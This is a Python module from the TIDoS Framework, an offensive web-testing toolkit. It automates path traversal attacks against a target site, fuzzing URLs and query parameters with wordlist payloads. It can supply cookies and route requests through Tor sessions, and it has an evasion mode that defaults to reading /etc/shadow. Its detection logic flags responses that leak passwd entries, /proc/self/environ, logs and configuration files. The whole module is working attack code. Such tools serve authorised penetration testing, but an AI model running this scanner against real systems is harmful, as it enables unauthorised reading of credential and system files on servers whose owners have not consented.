#!/usr/bin/env python3
# coding:  utf-8

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#Author: @_tID
#This module requires TIDoS Framework
#https://github.com/0xInfection/TIDoS-Framework


import os
import re
import sys
import urllib
import requests as wrn
import time
from core.database.database_module import save_data
from core.variables import database
from core.methods.cache import targetname
import inspect
from core.methods.print import summary
from multiprocessing import Pool, TimeoutError
from core.methods.multiproc import listsplit, file2list
from core.methods.tor import session
from core.variables import processes
from core.Core.colors import O, GR, R, G, B, C, W, color, RD
from requests.packages.urllib3.exceptions import InsecureRequestWarning

wrn.packages.urllib3.disable_warnings(InsecureRequestWarning)

global active0
#loggy = []
#enviro = []
#fud = []
#generic = []
#cnfy = []
#gotcha = []
active0 = False

query = [False]
siteinput = [""]
sitecontent = [None]

info = "This module tries to find path traversal vulnerabilities on the target webpage. It is capable of in-path, as well as query attacks, and features two modes: a simple mode, recovering all possible paths, and a powerful evasion engine, attacking a specific path. Also, the user can provide cookies and his own dictionary."
searchinfo = "Path Traversal Finder"
properties = {"DIRECTORY":["Sensitive directory. Attack target will be http://site.com/sensitive", " "], "PARALLEL":["Parallelise Attack? [1/0]", " "], "COOKIE":["Cookie to be used for the attack", " "], "QUERY":["Query-parameter based attack? [1/0]", " "], "PARAM":["Parameter to be used with QUERY", " "], "EVASION":["Try to evade sanitisations (specific file lookup) [1/0]", " "], "FILE":["File to be searched by EVASION (default: /etc/shadow)", " "], "DICT":["Path to dictionary to be used in normal attacks (default: files/fuzz-db/pathtrav_paths.lst)", " "]}

def atckpre(evasion, filepath, owebsite, plist, requests):
    go = []
    ge = []
    lo = []
    en = []
    fu = []
    cn = []
    for i in plist:
        paths = atck(evasion, filepath, owebsite, i, requests)
        go += paths[0]
        ge += paths[1]
        lo += paths[2]
        en += paths[3]
        fu += paths[4]
        cn += paths[5]
    return (go, ge, lo, en, fu, cn)


def atck(evasion, filepath, owebsite, line, requests):
    got = []
    gen = []
    log = []
    env = []
    fu2 = []
    cnf = []
    c = line.strip('\n')
    if evasion and filepath != "":
        c = c.replace("etc/shadow", filepath)
    if not c.startswith('/'):
        website = owebsite + '/' + c
    else:
        website = owebsite + c
    #status_code = 500
    print(C+' [+] Testing Url : '+color.END+website+C)
    req = requests.get(website, headers=gen_headers, allow_redirects=False, timeout=7, verify=False)
    content = str(req.content)

    if str(req.status_code).startswith('2') or req.status_code == 302:
        # same stuff as in _lfi module
        if ("[<a href='function.main'>function.main</a>" not in content
                and "[<a href='function.include'>function.include</a>" not in content
                and ("Failed opening" not in content and "for inclusion" not in content)
                and "failed to open stream:" not in content
                and "open_basedir restriction in effect" not in content
                and ("root:" in content or ("sbin" in content and "nologin" in content)
            or "DB_NAME" in content or "daemon:" in content or "DOCUMENT_ROOT=" in content or 'root:x:' in content
            or "PATH=" in content or "HTTP_USER_AGENT" in content or "HTTP_ACCEPT_ENCODING=" in content
            or "users:x" in content or ("GET /" in content and ("HTTP/1.1" in content or "HTTP/1.0" in content))
            or "apache_port=" in content or "cpanel/logs/access" in content or "allow_login_autocomplete" in content
            or "database_prefix=" in content or "emailusersbandwidth" in content or "adminuser=" in content
            or 'daemon:x:' in content or 'bin:x:' in content or 'mail:x:' in content or 'user:x:' in content
            or ("error]" in content and "[client" in content and "log" in website)
            or ("[error] [client" in content and "File does not exist:" in content and "proc/self/fd/" in website)
            or ("State: R (running)" in content and ("Tgid:" in content or "TracerPid:" in content or "Uid:" in content)
                and "/proc/self/status" in website))):
            print(O+" [+] '{}'".format(str(website))+C+color.TR3+C+G+"Vulnerable"+C+color.TR2+C)
            print(W+color.BOLD+' [+] Content Received : ')
            if len(content) < 10000:
                print(W+content+C)
            else:
                print(W+" [!] File too large to be displayed."+C)
            website = str(website)
            got.append(website)

            if("log" in website):
                log.append(website)
            elif("/proc/self/environ" in website):
                env.append(website)
            elif("/proc/self/fd" in website):
                fu2.append(website)
            elif(".cnf" in website or ".conf" in website or ".ini" in website):
                cnf.append(website)
            else:
                gen.append(website)
        elif query:
            #print("query, {}, {}".format(siteinput[0], website))
            origrq = requests.get(siteinput[0])
            con2 = origrq.content
            con = req.content
            conn = str(con)
            #print("{}\n\n\n {}".format(content,con2))
            if (con != con2 and "[<a href='function.main'>function.main</a>" not in conn
                and "[<a href='function.include'>function.include</a>" not in conn
                and ("Failed opening" not in conn and "for inclusion" not in conn)
                and "failed to open stream:" not in conn
                and "open_basedir restriction in effect" not in conn
                and "swords" not in conn
                and "file_exists() expects parameter 1 to be a valid path" not in conn):
                print(O+" [+] '{}'".format(str(website))+C+color.TR3+C+G+"Vulnerable"+C+color.TR2+C)
                print(W+color.BOLD+' [+] Content Received : ')
                if len(content) < 10000:
                    print(W+content+C)
                else:
                    print(W+" [!] File too large to be displayed."+C)

                website = str(website)
                got.append(website)

                if("log" in website):
                    log.append(website)
                elif("/proc/self/environ" in website):
                    env.append(website)
                elif("/proc/self/fd" in website):
                    fu2.append(website)
                elif(".cnf" in website or ".conf" in website or ".ini" in website):
                    cnf.append(website)
                else:
                    gen.append(website)
            else:
                print(RD+" [-] '"+str(website)+"'"+O+" [Not vulnerable]"+C)
        else:
            print(RD+" [-] '"+str(website)+"'"+O+" [Not vulnerable]"+C)
    elif req.status_code == 404:
        pass
    elif req.status_code == 403:
        print(O+" [+] '{}'".format(str(website))+C+color.TR3+C+G+"Vulnerable"+C+color.TR2+C)
        print(" [!] 403 - Forbidden")
    elif req.status_code == 401:
        print(R+" [-] 401 - Missing authentication.\n")
    else:
        print(R+" [-] Problem connecting to the website...\n")
    return (got, gen, log, env, fu2, cnf)


def check0x00(website0, gen_headers, parallel):
    #print(query)
    #print(siteinput)
    loggy = []
    enviro = []
    fud = []
    generic = []
    cnfy = []
    gotcha = []
    if properties["EVASION"][1] == " ":
        ev = input(C+"\n [?] Perform Evasion Attack? (specific file ; enter for no) :> ")
        evasion = ev != ""
    else:
        evasion = properties["EVASION"][1] == "1"
    if not evasion:
        if properties["DICT"][1] == " ":
            print(C+' [!] Enter the filename containing paths '+O+'(Default: files/pathtrav_paths.lst)'+C)
            fi = input(C+" [*] Custom filepath (press Enter for default) :> ")
        elif properties["DICT"][1].lower() == "none":
            fi = ""
        else:
            fi = properties["DICT"][1]
        if fi == '':
            print(GR+' [*] Using default filepath...')
            fi = getFile0x00('files/fuzz-db/pathtrav_paths.lst')
        else:
            fi = getFile0x00(fi)
        filepath = ""
    else:
        fi = getFile0x00('files/fuzz-db/pathtrav_evasion.lst')
        if properties["FILE"][1] == " ":
            filepath = input(" [!] Enter file and path to search (Default: etc/shadow) :> ")
        elif properties["FILE"][1].lower() == "none":
            filepath = ""
        else:
            filepath = properties["FILE"][1]

    if(active0 is False):
        owebsite = website0
    else:
        #owebsite = ahurl
        owebsite = website0

    print("")
    requests = session()
    if not parallel:
        for line in open(fi):
            paths = atck(evasion, filepath, owebsite, line, requests)
            gotcha += paths[0]
            generic += paths[1]
            loggy += paths[2]
            enviro += paths[3]
            fud += paths[4]
            cnfy += paths[5]
    else:
        pathlist = file2list(fi)
        pthlst = listsplit(pathlist, round(len(pathlist)/processes))
        with Pool(processes=processes) as pool:
            res = [pool.apply_async(atckpre, args=(evasion,filepath,owebsite,l,requests,)) for l in pthlst]
            #res1 = pool.apply_async(portloop, )
            for i in res:
                paths = i.get()
                gotcha += paths[0]
                generic += paths[1]
                loggy += paths[2]
                enviro += paths[3]
                fud += paths[4]
                cnfy += paths[5]
    #print(G+"\n [+] Retrieved %s interesting paths..." % str(len(gotcha))+C+"\n")
    #print("\n{}-------{}-<> {}Pathtrav: {}{} int. paths{} <>-{}-------{}\n".format(color.END,C,O,G,str(len(gotcha)),C,color.END,C))
    foundpaths = "   {}{}{}{}{}{}{}{} paths leaked.".format(color.TR5,C, G, str(len(gotcha)), color.END, color.TR2, color.END, color.CURSIVE)
    summary("pathtrav", foundpaths)
    time.sleep(0.5)

    if len(loggy) > 0:
        printOut0x00("Logs",loggy)
    if len(enviro) > 0:
        printOut0x00("/proc/self/environ",enviro)
    if len(fud) > 0:
        printOut0x00("/proc/self/fd",fud)
    if len(cnfy) > 0:
        printOut0x00("Configuration", cnfy)
    if len(generic) > 0:
        printOut0x00("Diverse",generic)
    if gotcha:
        data = "Paths leaked!\n" + str(gotcha)
        save_data(database, module, lvl1, lvl2, lvl3, name, data)
    else:
        save_data(database, module, lvl1, lvl2, lvl3, name, "No vulnerable paths found.")


def printOut0x00(pathlist,stack):

    print(" %s%s:%s [%s]" %(O,pathlist,C,len(stack)))
    print('')
    print(color.END+' [*] Displaying paths obtained...\n')
    for path in stack:
        #print(C+G+' [+] Path :> '+C+O + str(path)+C)
        print(C+G+' [+] Path :>'+C+color.TR1+C+O + str(path)+C+color.TR4+C)
    print(C)

def getFile0x00(filename):

    while True:
        if(filename[0] == '\''):
            filename = filename[1:]
        if(filename[len(filename)-1] == '\''):
            filename = filename[:-1]
        if(os.path.exists(filename)):
            return filename
        print(R+" [-] Cannot find '%s'!" % filename)
        filename = input(C+' [*] File containing paths :> ')

def pathtrav(web):
    global name
    name = targetname(web)
    global lvl2
    lvl2 = inspect.stack()[0][3]
    global module
    module = "VulnAnalysis"
    global lvl1
    lvl1 = "Critical Vulnerabilities"
    global lvl3
    lvl3 = ""
    #global gotcha
    time.sleep(0.5)
    #print(R+'\n     ================================================')
    #print(R+'\n      P A T H   T R A V E R S A L  (Sensitive Paths)')
    #print(R+'     ---<>----<>----<>----<>----<>----<>----<>----<>-\n')

    from core.methods.print import pvln
    pvln("path traversal") 
                  
    try:
        if properties["DIRECTORY"][1] == " ":
            print(GR+' [!] Input the directory to be used... Final Url will be like '+O+'"http://site.com/sensitive"'+GR)
            param = input(C+' [!] Enter directory asssociated (eg. /sensitive) [Enter for None] :> ')
        elif properties["DIRECTORY"][1].lower() == "none":
            param = ""
        else:
            param = properties["DIRECTORY"][1]
        if properties["PARALLEL"][1] == " ":
            pa = input("\n [?] Parallelise Attack? (enter if not) :> ")
            parallel = pa != ""
        else:
            parallel = properties["PARALLEL"][1] == "1"
        if properties["COOKIE"][1] == " ":
            input_cookie = input("\n [§] Got cookies? [Enter if none] :> ")
        elif properties["COOKIE"][1].lower() == "none":
            input_cookie = ""
        else:
            input_cookie = properties["COOKIE"][1]
        global gen_headers
        gen_headers =    {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201',
                          'Accept-Language':'en-US;',
                          'Accept-Encoding': 'gzip, deflate',
                          'Accept': 'text/html,application/xhtml+xml,application/xml;',
                          'Connection':'close'}
        if(len(input_cookie) > 0):
            gen_headers['Cookie'] = input_cookie
            #gen_headers['Cookie'] = "security=low; PHPSESSID=n3o05a33llklde1r2upt98r1k2"
        if param.startswith('/'):
            web00 = web + param
        elif param == '':
            web00 = web + param
        else:
            web00 = web + '/' + param

        if properties["QUERY"][1] == " ":
            input_query = input("\n [§] Query Attack? [Enter if not] :> ")
        elif properties["QUERY"][1] == "0":
            input_query = ""
        else:
            input_query = "1"
        #print(input_query)
        if input_query != "":
            query[0] = True
            if properties["PARAM"][1] == " ":
                param = input(" [§] Enter parameter :> ")
            else:
                param = properties["PARAM"][1]
            web00 = web00 + "?" + param + "="
        siteinput[0] = web00

        check0x00(web00, gen_headers, parallel)

    except KeyboardInterrupt:
        print(R+' [-] User Interruption!')
        return

    except Exception as e:
        print(R+' [-] Exception encountered during processing...')
        print(R+' [-] Error : '+str(e))

def attack(web):
    web = web.fullurl
    pathtrav(web)
